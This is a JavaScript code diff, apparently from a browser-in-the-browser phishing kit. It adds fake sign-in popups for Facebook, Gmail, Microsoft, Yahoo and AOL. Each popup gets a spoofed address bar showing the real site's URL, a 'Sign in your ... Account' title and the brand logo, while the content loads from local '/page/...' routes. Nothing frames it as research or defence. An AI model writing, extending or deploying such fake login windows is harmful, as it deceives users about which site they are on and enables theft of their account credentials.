@@ -114,6 +114,16 @@ function SeturlSource(url) {
 
 }
 
+function SetImageSrc(url) {
+  let image = document.getElementById("logo");
+  image.src = url;
+}
+
+function SeturlTitle(url) {
+  let domain = document.getElementById("logo-description")
+  domain.innerText = url;
+}
+
 //// Pop-up appear on click with delay ////
 $("#clickme").click(function(){
   setIframeSource("/page")
@@ -124,21 +134,36 @@ $("#clickme").click(function(){
 $("#clickme1").click(function(){
   setIframeSource("/page/facebook");
   SeturlSource("https://facebook.com/");
+  SeturlTitle("Sign in your Facebook Account");
+  SetImageSrc("Windows-DarkMode-Delay/index.png");
 });
 
 //// Pop-up appear on click with delay ////
 $("#clickme2").click(function(){
   setIframeSource("/page/gmail");
   SeturlSource("https://gmail.com/");
+  SeturlTitle("Sign in your Gmail Account");
+  SetImageSrc("Windows-DarkMode-Delay/Google_'G'_Logo.svg.png");
 });
 
 //// Pop-up appear on click with delay ////
 $("#clickme3").click(function(){
   setIframeSource("/page/microsoft")
   SeturlSource("https://microsoft.com/")
+  SeturlTitle("Sign in your Microsoft Account");
+  SetImageSrc("Windows-DarkMode-Delay/microsoft.png");
 });
 
 $("#clickme4").click(function(){
   setIframeSource("/page/yahoo")
   SeturlSource("https://yahoo.com/")
+  SeturlTitle("Sign in your Yahoo Account");
+  SetImageSrc("Windows-DarkMode-Delay/Yahoo.png");
 });
+$("#clickme5").click(function(){
+  setIframeSource("/page/aol");
+  SeturlSource("https://login.aol.com/");
+  SeturlTitle("Sign in your Aol Account");
+  SetImageSrc("Windows-DarkMode-Delay/apple-1.png");
+});
+
